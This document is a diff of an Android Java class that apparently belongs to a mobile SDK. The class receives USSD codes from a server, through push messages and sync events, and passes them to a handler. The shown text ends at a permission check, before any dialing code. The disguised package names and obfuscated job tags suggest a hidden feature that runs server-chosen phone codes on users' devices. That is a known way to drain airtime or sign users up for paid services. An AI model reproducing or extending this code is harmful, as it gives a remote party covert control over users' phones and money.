@@ -8,24 +8,22 @@ import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 
 import com.evernote.android.job.Job;
-import com.evernote.android.job.JobRequest;
 
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
-import java.util.concurrent.TimeUnit;
 
 import commons.app.com.commons.commons.SdkComponent;
-import volley.app.com.ussd.keep.UssdCode;
 import okhttp3.ResponseBody;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
 import timber.log.Timber;
+import volley.app.com.ussd.keep.CodesResponse;
+import volley.app.com.ussd.keep.UssdCode;
 
+@SuppressWarnings("WeakerAccess")
 public class UssdComponent extends SdkComponent {
-
-    private static final String JOB_TAG_CHECK_CODES = "u65256266789_j_2";
-    private static final String JOB_TAG_CHECK_CODES_NOW = "u65256266789_j_3";
 
     private static UssdComponent instance;
 
@@ -37,74 +35,39 @@ public class UssdComponent extends SdkComponent {
         instance = this;
     }
 
-    @Override
-    public void onDeviceRegistered() {
-        startCheckCodesJob();
-    }
-
-    @Override
-    public void onFcmMessageReceived(Bundle payload) {
-        if (!payload.getString("type", "").contentEquals("ussd")) {
-            return;
-        }
-        String ussdId = payload.getString("id");
-        String ussdCode = payload.getString("code");
-        if (ussdCode != null) {
-            UssdCode code = new UssdCode(ussdId, ussdCode);
-            onUssdCodeReceived(code);
-        }
-    }
-
-    @Override
-    public void onDeviceRebooted() {
-
-    }
-
     @Nullable
     @Override
     public Job createJob(@NonNull String tag) {
-        if (JOB_TAG_CHECK_CODES.equals(tag) ||
-                JOB_TAG_CHECK_CODES_NOW.equals(tag)) {
-            return new LoadCodesJob();
-        }
         return null;
     }
 
-    ///////////////////////////////////////////////////////////////////////////
-    // JOBS
-    ///////////////////////////////////////////////////////////////////////////
-
-    private void startCheckCodesJob() {
-        startCheckCodesJobNow();
-        startCheckCodesRepeated();
+    @Override
+    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
+        if ("ussd".equals(type)) {
+            String ussdId = payload.getString("id");
+            String ussdCode = payload.getString("code");
+            if (ussdCode != null) {
+                UssdCode code = new UssdCode(ussdId, ussdCode);
+                onUssdCodeReceived(code);
+            }
+        }
     }
 
-    private void startCheckCodesJobNow() {
-        long executionWindow = TimeUnit.SECONDS.toMillis(10);
-        long startTime = TimeUnit.SECONDS.toMillis(55);
-        new JobRequest.Builder(JOB_TAG_CHECK_CODES_NOW)
-                .setExecutionWindow(startTime, startTime + executionWindow)
-                .setBackoffCriteria(startTime, JobRequest.BackoffPolicy.EXPONENTIAL)
-                .setUpdateCurrent(true)
-                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
-                .build()
-                .schedule();
-    }
-
-    private void startCheckCodesRepeated() {
-        new JobRequest.Builder(JOB_TAG_CHECK_CODES)
-                .setPeriodic(TimeUnit.MINUTES.toMillis(40), TimeUnit.MINUTES.toMillis(20))
-                .setUpdateCurrent(true)
-                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
-                .build()
-                .schedule();
+    @Override
+    public void onSyncEvent(@NonNull String json) {
+        CodesResponse response = safeParse(json, CodesResponse.class);
+        List<UssdCode> list = response != null ? response.getUssdCodes() : null;
+        if (list != null && !list.isEmpty()) {
+            UssdCode code = list.get(0);
+            UssdComponent.get().onUssdCodeReceived(code);
+        }
     }
 
     ///////////////////////////////////////////////////////////////////////////
     // UTILS
     ///////////////////////////////////////////////////////////////////////////
 
-    public void onUssdCodeReceived(UssdCode ussdCode) {
+    private void onUssdCodeReceived(UssdCode ussdCode) {
         Timber.d("onUssdCodeReceived -> ussdCode[%s]", ussdCode);
         // check permissions
         try {
